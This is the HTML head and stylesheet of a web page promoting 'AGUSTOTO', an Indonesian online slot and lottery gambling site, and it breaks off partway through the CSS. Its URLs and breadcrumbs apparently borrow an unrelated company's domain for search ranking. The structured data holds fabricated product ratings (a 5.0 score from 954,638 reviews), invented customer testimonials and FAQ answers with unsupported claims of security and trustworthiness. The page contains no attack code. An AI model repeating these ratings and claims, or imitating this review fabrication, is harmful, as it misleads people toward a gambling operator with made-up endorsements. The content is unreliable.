<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat</title>
  <meta name="description" content="Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.">
  <meta name="robots" content="index, follow">
  <link rel="preconnect" href="https://www.googletagmanager.com" crossorigin>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LSM1YJSPZ" nonce="se3iyzEHMc9FQEB4wSyd0w=="></script>
  <script nonce="se3iyzEHMc9FQEB4wSyd0w==">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("consent","default",{ad_storage:"denied",ad_user_data:"denied",ad_personalization:"denied",analytics_storage:"granted",wait_for_update:500});gtag("js",new Date);gtag("config","G-0LSM1YJSPZ",{send_page_view:!0,linker:{domains:["plazait.co.id","www.plazait.co.id"]}});window.ga4Ecomm={viewItem:function(e){if(!window.gtag)return;try{gtag("event","view_item",{currency:e.currency||"IDR",value:e.value||0,items:[{item_id:e.item_id||"",item_name:e.item_name||"",item_brand:e.item_brand||"",item_category:e.item_category||"",price:e.price||0,quantity:1}]})}catch(t){}},addToCart:function(e){if(!window.gtag)return;try{gtag("event","add_to_cart",{currency:e.currency||"IDR",value:(e.price||0)*(e.quantity||1),items:[{item_id:e.item_id||"",item_name:e.item_name||"",item_brand:e.item_brand||"",item_category:e.item_category||"",price:e.price||0,quantity:e.quantity||1}]})}catch(t){}}};</script>
  <meta property="og:locale" content="id_ID">
  <meta property="og:site_name" content="AGUSTOTO">
  <meta property="og:type" content="product">
  <meta property="og:title" content="AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat">
  <meta property="og:description" content="Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.">
  <meta property="og:url" content="https://www.chemtrols.com/career.php/">
  <meta property="og:image" content="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp">
  <meta property="og:image:alt" content="AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat">
<meta property="product:price:amount" content="5000">
<meta property="product:price:currency" content="IDR">
<meta property="product:availability" content="out of stock">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat">
<meta name="twitter:description" content="Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.">
<meta name="twitter:image" content="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp">

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
                {
                    "@type": "ListItem",
                    "position": 1,
                    "name": "slot",
                    "item": "https://www.chemtrols.com/"
                },
                {
                    "@type": "ListItem",
                    "position": 2,
                    "name": "slot maxwin",
                    "item": "https://www.chemtrols.com/slot-maxwin/"
                },
                {
                    "@type": "ListItem",
                    "position": 3,
                    "name": "link slot",
                    "item": "https://www.chemtrols.com/career.php/"
                }
  ]
}
</script>
    <script type="application/ld+json">
      {
        "@context": "http:\/\/schema.org",
        "@type": "Product",
        "name": "AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat",
        "description": "Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.",
        "image": "https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp",
        "offers": {
          "@type": "http:\/\/schema.org\/Offer",
          "price": 9999,
          "url": "https://shortt.ink/anakbinjai",
          "priceCurrency": "IDR",
          "availability": "http:\/\/schema.org\/InStock"
        }
      }
    </script>
    <script type="application/ld+json">
      {
        "@context": "http:\/\/schema.org\/",
        "@type": "WebPage",
        "speakable": {
          "@type": "SpeakableSpecification",
          "cssSelector": [".description"],
          "xpath": ["\/html\/head\/title"]
        }
      }
    </script>
    <!-- ZS -->
    <!-- Schema JSON untuk SBO -->
<script type="application/ld+json">
{
"@context": "https://schema.org/",
"@type": "Product",
"name": "AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat",
"url": "https://shortt.ink/anakbinjai",
"sku": "AGUSTOTO",
"image": [
  "https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp"
],
"description": "Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.",
"brand": {
  "@type": "Organization",
  "name": "AGUSTOTO"
},
"offers": {
  "@type": "Offer",
  "name": "AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat",
  "sku": "LOGIN AGUSTOTO",
  "price": "9999",
  "priceCurrency": "IDR",
  "availability": "https://schema.org/InStock"
}
}
</script>

<script type="application/ld+json">
{
"@context": "https://schema.org/",
"@type": "Product",
"name": "AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat",
"image": "https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp",
"description": "Slot WD AGUSTOTO memberikan pengalaman akses situs slot gacor dengan Daftar Slot Anti Lag, lengkap dengan proses deposit yang mudah dan keamanan bagi pengguna.",
"sku": "TOGEL ONLINE",
"offers": {
  "@type": "Offer",
  "priceCurrency": "IDR",
  "url": "https://shortt.ink/anakbinjai",
  "availability": "https://schema.org/InStock",
  "price": "9999.00"
}
}
</script>

<script type="application/ld+json" id="bv-jsonld-bvloader-summary">
{
"@context": "https://schema.org/",
"@id": "https://shortt.ink/anakbinjai",
"aggregateRating": {
  "@type": "AggregateRating",
  "itemReviewed": {
    "@type": "IndividualProduct",
    "name": "AGUSTOTO"
  },
  "ratingValue": "5.0",
  "reviewCount": 954638,
  "bestRating": 5
}
}
</script>



<script type="application/ld+json" id="bv-jsonld-reviews-data">
{
  "@context": "https://schema.org",
  "@type": "Organization",
  "@id": "https://shortt.ink/anakbinjai",
  "name": "LOGIN AGUSTOTO",
  "alternateName": "BANDAR TOGEL ONLINE",
  "url": "https://shortt.ink/anakbinjai",
  "review": [
    {
      "@type": "Review",
      "dateCreated": "2026-03-31T12:28:35+00:00",
      "datePublished": "2026-03-31T12:28:35+00:00",
      "headline": "DAFTAR AGUSTOTO",
      "reviewBody": "AGUSTOTO benar-benar memudahkan akses login bandar togel online terpercaya 24 jam nonstop antarmuka yang elegan dan proses masuk yang cepat membuat saya bisa bertaruh kapan saja tanpa gangguan teknis sehingga pengalaman bermain terasa lebih mewah dan efisien.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      },
      "author": {
        "@type": "Person",
        "name": "Taufan â€“ Surabaya"
      }
    },
    {
      "@type": "Review",
      "dateCreated": "2026-04--02T18:28:21+00:00",
      "datePublished": "2026-04-03T18:28:21+00:00",
      "headline": "LINK AGUSTOTO",
      "reviewBody": "Saya mengapresiasi bagaimana AGUSTOTO menyediakan proses deposit cepat yang jelas dan transparan; konfirmasi transaksi berjalan instan sehingga waktu menunggu berkurang dan pemain bisa langsung fokus pada strategi permainan.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      },
      "author": {
        "@type": "Person",
        "name": "Thomas Tampi â€“ Semarang"
      }
    },
    {
      "@type": "Review",
      "dateCreated": "2026-04-05T19:28:18+00:00",
      "datePublished": "2026-04-05T19:28:18+00:00",
      "headline": "SLOT GACOR",
      "reviewBody": "Keamanan data di AGUSTOTO memberi rasa tenang yang luar biasa; fitur enkripsi dan proteksi akun bekerja baik sehingga informasi pribadi dan riwayat transaksi tetap aman, membuat platform ini tampak sangat profesional dan dapat dipercaya.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      },
      "author": {
        "@type": "Person",
        "name": "Soesilowati â€“ Makassar"
      }
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
  "@type": "Question",
  "name": "Apa itu AGUSTOTO dan mengapa disebut bandar togel online terpercaya 24 jam nonstop?",
  "acceptedAnswer": {
    "@type": "Answer",
    "text": "AGUSTOTO adalah platform bandar togel online yang menyediakan akses login 24 jam nonstop, didesain untuk kemudahan pengguna dengan antarmuka elegan dan sistem yang handal. Disebut terpercaya karena menerapkan protokol keamanan, verifikasi transaksi, dan layanan pelanggan penuh waktu yang memastikan pengalaman taruhan yang aman, konsisten, dan minim gangguan."
  }
},
{
  "@type": "Question",
  "name": "Bagaimana proses deposit cepat bekerja di AGUSTOTO dan apa manfaatnya bagi pemain?",
  "acceptedAnswer": {
    "@type": "Answer",
    "text": "Proses deposit cepat di AGUSTOTO mengandalkan integrasi dengan metode pembayaran modern dan sistem konfirmasi otomatis sehingga dana tercatat hampir seketika. Manfaatnya termasuk pengurangan waktu tunggu sebelum taruhan bisa ditempatkan, minimnya risiko kehilangan peluang taruhan, dan alur bermain yang lebih efisien serta menyenangkan."
  }
},
{
  "@type": "Question",
  "name": "Seberapa kuat perlindungan keamanan data di AGUSTOTO dan fitur apa yang digunakan?",
  "acceptedAnswer": {
    "@type": "Answer",
    "text": "AGUSTOTO menerapkan enkripsi tingkat tinggi, proteksi berlapis untuk autentikasi pengguna, dan kebijakan privasi ketat yang melindungi informasi pribadi serta transaksi. Fitur seperti enkripsi SSL/TLS, pemantauan aktivitas mencurigakan, dan kontrol akses membantu meminimalkan risiko kebocoran data dan penipuan, sehingga pemain dapat bermain dengan tenang."
  }
},
{
  "@type": "Question",
  "name": "Apakah layanan pelanggan AGUSTOTO benar-benar tersedia 24 jam nonstop dan saluran apa saja yang bisa digunakan?",
  "acceptedAnswer": {
    "@type": "Answer",
    "text": "Ya, AGUSTOTO menawarkan layanan pelanggan 24 jam nonstop melalui beberapa saluran seperti live chat, email, dan pusat bantuan di situs. Tim dukungan dilatih untuk menangani pertanyaan teknis, panduan deposit, dan masalah akun secara responsif sehingga pemain mendapatkan bantuan cepat untuk menjaga kelancaran taruhan."
  }
},
{
  "@type": "Question",
  "name": "Bagaimana AGUSTOTO memastikan pengalaman login yang mudah namun tetap aman?",
  "acceptedAnswer": {
    "@type": "Answer",
    "text": "AGUSTOTO menggabungkan desain antarmuka yang intuitif dengan langkah keamanan seperti verifikasi dua faktor bila diperlukan, enkripsi data, dan pemeriksaan aktivitas tidak biasa. Pendekatan ini memastikan pengguna dapat masuk dengan cepat tanpa mengorbankan integritas akun, sehingga akses login tetap nyaman dan terlindungi."
  }
}
  ]
}
</script>
  <!-- User Session Data -->
    <meta name="csrf-token" content="9ce6e4a17f7cc189893df9e47789b13e98829450d516a0cae5ca7b5f43e5dadc">
  <meta name="user-logged-in" content="false">
  <meta name="user-id" content="0">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />

  <link rel="shortcut icon" href="https://chemtrols-com.agustoto.xyz/asset/favicon-brand-a1071180d5856d11.png" type="image/x-icon">
  <style data-inlined="style.css">
@font-face {
    font-family: 'Segoe UI';
    src: url('/assets/fonts/segoeui.woff2') format('woff2'),
         url('/assets/fonts/segoeui.woff') format('woff');
    font-weight: 400;
    font-style: normal;
}

:root {
  --brand-50:#FFF5E6;
  --brand-100:#FFE7CC;
  --brand-500:#8adeff;
  --brand-600:#8adeff;
  --gray-900:#1F1F23;
  --gray-700:#3D3F45;
  --gray-500:#6F737B;
  --gray-300:#C5C9CF;
  --gray-100:#F3F5F7;
  --border:#E4E7EB;
  --radius:8px;
  --transition: .18s ease;
  /* font-family: "Inter", system-ui, sans-serif; */
  font-family: 'Segoe UI', sans-serif;
}

* { box-sizing: border-box; }
body { 
  margin:0; 
  padding-bottom: 0; /* Reset for desktop */
  color:var(--gray-900); 
  background:#fff; 
}
img { max-width:100%; display:block; }

.container {
  width:100%;
  max-width:1280px;
  margin:0 auto;
  padding:10px 0;
}

.topbar {
  background:#111;
  color:#fff;
  font-size:13px;
}
.topbar-inner {
  display:flex;
  justify-content:space-between;
  align-items:center;
  min-height:36px;
}
.topbar a { color:#fff; text-decoration:none; margin-left:12px; }

/* ========== Desktop base (Glassmorphism Modern with Warm Gradient) ========== */
.navbar {
  background:linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(255,245,230,0.85) 100%);
  backdrop-filter:blur(12px);
  -webkit-backdrop-filter:blur(12px);
  border-bottom:1px solid rgba(228,231,235,0.6);
  box-shadow:0 2px 16px -4px rgba(0,0,0,0.08);
  position:sticky;
  top:0;
  z-index:500;
  transition:all .3s ease;
}

/* Accent line gradient orange */
.navbar::after {
  content:'';
  position:absolute;
  bottom:0;
  left:0;
  right:0;
  height:2px;
  background:linear-gradient(90deg,transparent 0%, var(--brand-500) 20%, var(--brand-600) 50%, var(--brand-500) 80%, transparent 100%);
  opacity:0.5;
}

.nav-inner {
  display:flex;
  align-items:center;
  gap:24px;
  min-height:70px;
}
.nav-inner .search .m-search-ico { display: none; }

/* Secara default (desktop) ikon login disembunyikan; teks muncul */
.login-btn .login-ico { display:none; }
.navbar-logo {
  display: none;
  background:linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(255,245,230,0.85) 100%);
  backdrop-filter:blur(12px);
  -webkit-backdrop-filter:blur(12px);
  border-bottom:1px solid rgba(228,231,235,0.6);
  box-shadow:0 2px 16px -4px rgba(0,0,0,0.08);
  position:sticky;
  top:0;
  z-index:500;
}

/* Hide bottom navigation on desktop - only show on mobile */
.bottom-nav {
  display: none;
}

/* ==============================================================
   MOBILE (<=640px)
   ============================================================== */
@media (max-width:640px){
  .container { padding:10px 16px; }
  
  .topbar { display:none !important; }

  /* Add padding bottom for sticky bottom nav */
  body {
    padding-bottom: 68px; /* Height of bottom nav + safe area */
  }

  /* Mobile Top Navbar - Clean & Minimal */
  .navbar {
    background:linear-gradient(135deg, rgba(255,255,255,0.97) 0%, rgba(255,245,230,0.9) 100%);
    backdrop-filter:blur(16px);
    -webkit-backdrop-filter:blur(16px);
    box-shadow:0 2px 12px -3px rgba(0,0,0,0.08);
    border: 0;
  }

  /* Simple grid layout - Logo, Search, Category */
  .nav-inner {
    display:grid;
    grid-template-columns:1fr;
    gap:10px;
    padding:12px 16px 0 12px;
    min-height:auto;
  }

  /* Logo centered at top */
  .nav-inner .logo {
    justify-self:center;
    margin:0;
    display:flex;
  }
  .nav-inner .logo img { height:36px; }

  /* Search bar - full width */
  .nav-inner .search {
    position:relative;
    display:flex;
    align-items:center;
    gap:0;
    width:100%;
    height:44px;
    background:#fff;
    border:1.5px solid #e5e7eb;
    border-radius:12px;
    padding:0 12px;
    box-shadow:0 1px 3px rgba(0,0,0,0.04);
    transition:all .25s;
  }
  .nav-inner .search:focus-within {
    border-color:#8adeff;
    box-shadow:0 0 0 3px rgba(251, 146, 60, 0.1);
  }

  .nav-inner .search-icon-btn {
    color:#9ca3af;
    padding:4px;
    margin-right:4px;
  }
  
  .nav-inner .search-icon-btn svg {
    width:18px;
    height:18px;
  }

  .nav-inner .search input {
    flex:1;
    min-width:0;
    border:none;
    outline:none;
    background:transparent;
    font-size:14px;
    padding:0 8px;
    height:100%;
  }
  
  .nav-inner .ai-bot-toggle {
    padding:6px;
    margin-left:0;
  }
  
  .nav-inner .ai-bot-toggle .bot-icon {
    width:20px;
    height:20px;
  }
  
  .nav-inner .search-suggest {
    left:0;
    right:0;
    width:calc(100vw - 32px);
    margin-top:6px;
    border-radius:12px;
    max-height:70vh;
  }

  /* Hide desktop nav actions but keep structure for userMenu */
  .nav-inner .nav-actions {
    display:flex !important; /* Keep flex to allow userMenu positioning */
    visibility:hidden; /* Hide visually but keep in DOM */
    pointer-events:none; /* Disable interactions with hidden elements */
    position:absolute; /* Remove from flow */
    right:0;
    top:0;
  }
  
  /* Re-enable userMenu for logged-in users */
  .nav-inner .nav-actions #userMenu {
    visibility:visible !important;
    pointer-events:auto !important;
  }
  
  .nav-inner .logo { display: none; }
  .navbar-logo {
    display: block;
    /* background:linear-gradient(135deg, rgba(255,255,255,0.97) 0%, rgba(255,245,230,0.9) 100%); */
    backdrop-filter:blur(16px);
    -webkit-backdrop-filter:blur(16px);
    position: static; /* Remove sticky on mobile */
    box-shadow: none;
    border-bottom: 0;
    padding-top: .6rem;
  }
  .nav-inner .logo-mobile { display: block; }
  
  /* Category menu wrapper will handle visibility */

  /* ==============================================================
     BOTTOM NAVIGATION - Styles moved to bottom-nav.css
     ============================================================== */
  /* All bottom-nav styles now in /assets/css/bottom-nav.css */

  /* Hide desktop elements that now moved to bottom nav */
  #wishlistBtn,
  #notifBtn,
  #loginBtn { display:none !important; }
  
  /* Hide desktop user menu on mobile - use bottom sheet instead */
  .navbar #userMenu { 
    display:none !important;
  }
  
  .nav-actions .cart-indicator,
  .nav-actions .compare-indicator {
    display:none !important;
  }

  /* Hide category button from bottom nav */
  #bottomCategoryBtn {
    display: none !important;
  }
  
  /* User menu button styling for mobile - scoped to navbar only */
  .navbar #userMenu .login-btn.logged-in {
    width:40px;
    height:40px;
    padding:0;
    border-radius:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    background:rgba(255,255,255,0.95);
    backdrop-filter:blur(12px);
    -webkit-backdrop-filter:blur(12px);
    border:1px solid rgba(228,231,235,0.6);
    box-shadow:0 2px 12px -3px rgba(0,0,0,0.12);
  }
  
  .navbar #userMenu .login-btn.logged-in .login-text { 
    display:none; 
  }
  
  .navbar #userMenu .login-btn.logged-in .login-ico {
    display:inline;
    font-size:20px;
    line-height:1;
  }
  
  /* User dropdown positioning for mobile */
  .navbar #userMenu .user-dropdown {
    position:fixed !important;
    top:60px !important;
    right:16px !important;
    left:auto !important;
    min-width:200px;
    background:rgba(255,255,255,0.98);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);
    border:1px solid rgba(228,231,235,0.6);
    box-shadow:0 8px 24px -8px rgba(0,0,0,0.2);
    z-index:1002 !important;
    border-radius:12px;
    padding:8px 0;
  }
  
  /* Force visibility when not hidden attribute */
  .navbar #userMenu .user-dropdown:not([hidden]) {
    display:block !important;
    visibility:visible !important;
    opacity:1 !important;
  }

  /* Container untuk kategori dan tombol kategori sejajar */
  .navbar .container:last-child {
    display:flex !important;
    align-items:center !important;
    padding:4px 16px 6px !important;
    gap:5px;
    overflow:visible;
  }
  
  /* Wrapper untuk mega-cats dengan fade gradient (mobile only) */
  .mega-cats-wrapper {
    position:relative;
    flex:1;
    overflow:hidden;
    min-height:34px; /* Ensure content is visible */
    display:flex; /* Ensure wrapper is flex container */
  }
  
  /* Fade gradient indicator di ujung kanan (mobile only) */
  .mega-cats-fade {
    position:absolute;
    top:0;
    right:0;
    bottom:0;
    width:80px; /* Increased from 60px for better visibility */
    background:linear-gradient(to left, 
      rgba(255,245,230,1) 0%, 
      rgba(255,245,230,0.98) 15%,
      rgba(255,245,230,0.85) 35%, 
      transparent 100%);
    pointer-events:none;
    z-index:5; /* Increased z-index */
    transition:opacity 0.3s ease;
  }
  
  /* Kategori menu di mobile */
  .mega-cats.container {
    display:flex !important;
    gap:12px;
    overflow-x:auto;
    overflow-y:visible;
    -webkit-overflow-scrolling:touch;
    scrollbar-width:none;
    flex:1;
    padding:0 !important;
    margin:0 !important;
    position:relative; /* For z-index stacking */
    z-index:1; /* Below fade gradient */
  }
  .mega-cats.container::-webkit-scrollbar { display:none; }

  /* Styling untuk menu items di mobile */
  .mega-cats a {
    font-size:13px;
    padding:6px 10px;
    white-space:nowrap;
    flex-shrink:0;
    position:relative; /* Ensure proper stacking */
  }
  .mega-cats a.active {
    background:var(--brand-600);
    color:#fff;
    font-weight:600;
    border-radius:6px;
  }
  
  /* Tombol kategori di mobile */
  .mm-wp {
    flex-shrink:0;
  }
  .mm2-trigger {
    display:flex;
    align-items:center;
    gap:6px;
    padding:6px 12px;
    background:var(--gray-100);
    color:var(--gray-700);
    text-decoration:none;
    border-radius:6px;
    font-size:13px;
    white-space:nowrap;
  }
  
  .mm2-trigger .label-cat {display: none; }
  /* Tombol more kategori */
  .mega-more-btn {
    border:1px solid var(--border);
    background:#fff;
    border-radius:10px;
    padding:6px 14px;
    font-size:18px;
    cursor:pointer;
  }
  .mega-cats-more.active > .mega-more-btn {
    background:var(--brand-600);
    color:#fff;
    border-color:var(--brand-600);
  }
  .mega-more-dropdown {
    top:calc(100% + 10px);
    right:0;
    min-width:85vw;
    max-width:90vw;
    border-radius:16px;
  }
  .mega-more-grid {
    grid-template-columns:repeat(auto-fill,minmax(120px,1fr));
  }
  
  /* ==============================================================
     MOBILE USER BOTTOM SHEET
     ============================================================== */
  .mobile-user-sheet {
    position:fixed;
    top:0;
    left:0;
    right:0;
    bottom:0;
    z-index:10000;
    pointer-events:none;
  }
  
  .mobile-user-sheet.active {
    pointer-events:auto;
  }
  
  .mobile-user-sheet-backdrop {
    position:absolute;
    top:0;
    left:0;
    right:0;
    bottom:0;
    background:rgba(0,0,0,0.5);
    opacity:0;
    transition:opacity .3s ease;
  }
  
  .mobile-user-sheet.active .mobile-user-sheet-backdrop {
    opacity:1;
  }
  
  .mobile-user-sheet-content {
    position:absolute;
    bottom:0;
    left:0;
    right:0;
    background:#fff;
    border-radius:20px 20px 0 0;
    box-shadow:0 -4px 24px rgba(0,0,0,0.15);
    transform:translateY(100%);
    transition:transform .3s cubic-bezier(0.4, 0.0, 0.2, 1);
    padding-bottom:calc(68px + env(safe-area-inset-bottom));
  }
  
  .mobile-user-sheet.active .mobile-user-sheet-content {
    transform:translateY(0);
  }
  
  .mobile-user-sheet-header {
    padding:16px 20px 12px;
    border-bottom:1px solid #e5e7eb;
  }
  
  .mobile-user-sheet-handle {
    width:40px;
    height:4px;
    background:#d1d5db;
    border-radius:2px;
    margin:0 auto 16px;
  }
  
  .mobile-user-info {
    display:flex;
    align-items:center;
    gap:12px;
  }
  
  .mobile-user-avatar {
    width:48px;
    height:48px;
    border-radius:50%;
    background:linear-gradient(135deg, #FFE7CC, #FFD9A8);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:24px;
    flex-shrink:0;
  }
  
  .mobile-user-details {
    flex:1;
    min-width:0;
  }
  
  .mobile-user-name {
    font-size:16px;
    font-weight:600;
    color:#111827;
    margin-bottom:2px;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
  }
  
  .mobile-user-email {
    font-size:13px;
    color:#6b7280;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
  }
  
  .mobile-user-sheet-body {
    padding:8px 0;
  }
  
  .mobile-user-sheet-item {
    display:flex;
    align-items:center;
    gap:16px;
    padding:14px 20px;
    text-decoration:none;
    color:#374151;
    font-size:15px;
    transition:background .2s;
    border:none;
    background:none;
    width:100%;
    text-align:left;
    cursor:pointer;
  }
  
  .mobile-user-sheet-item:active {
    background:#f3f4f6;
  }
  
  .mobile-user-sheet-icon {
    font-size:20px;
    width:24px;
    text-align:center;
    flex-shrink:0;
  }
  
  .mobile-user-sheet-label {
    flex:1;
    font-weight:500;
  }
  
  .mobile-user-sheet-divider {
    height:1px;
    background:#e5e7eb;
    margin:8px 0;
  }
}

/* END NAVBAR */

.logo img { display:block; }
.search {
  flex:1;
  position:relative;
  display:flex;
  align-items:center;
  gap:0;
  background:#fff;
  border:1.5px solid #e5e7eb;
  border-radius:12px;
  padding:0 16px;
  height:38px;
  transition:all 0.3s ease;
}
.search:focus-within {
  border-color:#8adeff;
  box-shadow:0 0 0 3px rgba(251, 146, 60, 0.1);
}
.search input {
  flex:1;
  border:none;
  outline:none;
  background:transparent;
  font-size:15px;
  padding:0 12px;
  height:100%;
  color:#1f2937;
}
.search input::placeholder {
  color:#9ca3af;
}
.search-icon-btn {
  background:transparent;
  border:none;
  padding:0;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  color:#6b7280;
  transition:color 0.2s ease;
  flex-shrink:0;
}
.search-icon-btn:hover {
  color:#8adeff;
}
.search-suggest {
  position:absolute;
  left:0; right:0; top:100%;
  background:#fff;
  border:1px solid var(--border);
  border-radius:var(--radius);
  padding:8px 0;
  box-shadow:0 8px 20px rgba(0,0,0,.08);
  margin-top:4px;
  font-size:14px;
  max-height:260px;
  overflow:auto;
}
.search-suggest div {
  padding:6px 12px;
  cursor:pointer;
}
.search-suggest div:hover { background:var(--gray-100); }

.nav-actions { display:flex; gap:10px; align-items:center; }
.icon-btn, .login-btn {
  background:linear-gradient(135deg, rgba(255,255,255,0.95), rgba(249,250,251,0.9));
  border:1px solid rgba(228,231,235,0.6);
  padding:8px 12px;
  border-radius:var(--radius);
  cursor:pointer;
  font-size:14px;
  transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  height: 38px;
  position:relative;
  box-shadow:
    0 1px 3px rgba(0,0,0,0.06),
    0 0 0 1px rgba(255,255,255,0.5) inset;
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
}
.icon-btn:hover, .login-btn:hover { 
  background:linear-gradient(135deg, rgba(249,250,251,1), rgba(243,244,246,0.95));
  border-color:rgba(209,213,219,0.8);
  box-shadow:
    0 2px 8px rgba(0,0,0,0.08),
    0 0 0 1px rgba(255,255,255,0.6) inset;
  transform:translateY(-1px);
}
.cart-indicator, .compare-indicator { position:relative; }
.badge {
  background:linear-gradient(135deg, #8adeff, #8adeff);
  color:#fff;
  font-size:10.5px;
  font-weight:600;
  padding:2px 6px;
  border-radius:999px;
  position:absolute;
  top:-6px; 
  right:-6px;
  min-width:18px;
  height:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  box-shadow:
    0 2px 8px rgba(255, 80, 80, 0.35),
    0 0 0 2px #fff,
    0 0 12px -2px rgba(255, 80, 80, 0.35);
  transition:all 0.3s ease;
}
.icon-btn:hover .badge {
  transform:scale(1.08);
  box-shadow:
    0 4px 12px rgba(239,68,68,0.5),
    0 0 0 2px #fff,
    0 0 16px -2px rgba(239,68,68,0.7);
}
.badge.is-empty { display:none; }

/* User Menu Dropdown */
.user-menu {
  position:relative;
}
.user-dropdown {
  position:absolute;
  top:calc(100% + 8px);
  right:0;
  background:#fff;
  border:1px solid var(--border);
  border-radius:12px;
  box-shadow:0 10px 40px rgba(0,0,0,0.12);
  min-width:200px;
  padding:8px 0;
  z-index:9999;
}

/* Ensure dropdown is visible when not hidden */
.user-dropdown:not([hidden]) {
  display:block !important;
  visibility:visible !important;
  opacity:1 !important;
}

/* Mobile: Force user dropdown to be visible above everything */
@media (max-width:640px) {
  .user-dropdown:not([hidden]) {
    position:fixed !important;
    z-index:9999 !important;
    top:60px !important;
    right:16px !important;
  }
}

.dropdown-item {
  display:flex;
  align-items:center;
  gap:12px;
  padding:10px 16px;
  text-decoration:none;
  color:var(--gray-700);
  font-size:14px;
  transition:var(--transition);
  border:none;
  background:none;
  width:100%;
  text-align:left;
  cursor:pointer;
}
.dropdown-item:hover {
  background:var(--gray-100);
  color:var(--gray-900);
}
.dropdown-icon {
  font-size:16px;
  opacity:0.7;
}
.dropdown-separator {
  height:1px;
  background:var(--border);
  margin:8px 0;
}
.login-btn.logged-in {
  background:linear-gradient(135deg, rgba(255,245,230,0.8), rgba(255,231,204,0.6));
  border:1px solid rgba(242,140,26,0.2);
  color:var(--brand-700);
  max-width:200px; /* Prevent button from getting too wide */
  display:inline-flex;
  align-items:center;
  gap:10px;
  padding:4px 12px 4px 4px;
  transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  position:relative;
  overflow:hidden;
  box-shadow:
    0 1px 3px rgba(242,140,26,0.08),
    0 0 0 1px rgba(255,255,255,0.5) inset,
    0 0 12px -6px rgba(242,140,26,0.1);
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
}
/* Subtle background glow effect */
.login-btn.logged-in::before {
  content:'';
  position:absolute;
  top:50%;
  left:0;
  width:32px;
  height:32px;
  background:radial-gradient(circle, rgba(242,140,26,0.15), transparent 70%);
  transform:translateY(-50%);
  opacity:0;
  transition:opacity 0.3s ease;
}
.login-btn.logged-in:hover::before {
  opacity:1;
}
.login-btn.logged-in .user-avatar {
  width:32px;
  height:32px;
  border-radius:50%;
  background:linear-gradient(135deg, #FFE7CC 0%, #FFD9A8 50%, #FFCC80 100%);
  color:#8adeff;
  font-size:11.5px;
  font-weight:700;
  display:flex;
  align-items:center;
  justify-content:center;
  flex-shrink:0;
  letter-spacing:0.3px;
  position:relative;
  box-shadow:
    0 2px 8px rgba(242,140,26,0.25),
    0 1px 3px rgba(0,0,0,0.12),
    inset 0 1px 0 rgba(255,255,255,0.5);
  transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
/* Ring gradient border */
.login-btn.logged-in .user-avatar::before {
  content:'';
  position:absolute;
  inset:-2px;
  border-radius:50%;
  padding:2px;
  background:linear-gradient(135deg, #8adeff, #FFD9A8, #8adeff);
  -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
